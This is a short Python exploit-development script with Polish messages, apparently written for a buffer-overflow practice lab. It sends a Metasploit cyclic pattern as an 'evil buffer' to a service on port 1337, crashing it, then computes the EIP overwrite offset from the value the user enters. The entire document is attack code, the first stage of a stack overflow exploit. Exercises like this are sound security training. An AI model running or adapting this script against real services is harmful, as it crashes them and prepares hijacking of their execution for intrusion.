import os, socket

port = 1337
ip = "10.10.233.155"

length = 2220


print()
print("-> GENEROWANIE CIAGU ...")
ciag = os.popen("msf-pattern_create -l "+str(length)).read()


input("[entder] - wyslij ciag")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = "OVERFLOW1 " + ciag

try:
      s.connect((ip, port))
      print("Sending evil buffer...")
      s.send(bytes(buffer + "\r\n", "latin-1"))
      print("Done!")
except:
      print("Could not connect.")
      exit(0)


while(True):
    eip = input("Wartosc EIP = ")
    offset = os.popen("msf-pattern_offset -l"+str(length)+" -q "+str(eip)).read()
    offset = offset.split(" ")
    try:
        offset = int(offset[5])
        print("[OFFSET = "+str(offset)+"]")
        break
    except:
        print("Nie udalo sie obliczyc przesuniecia")
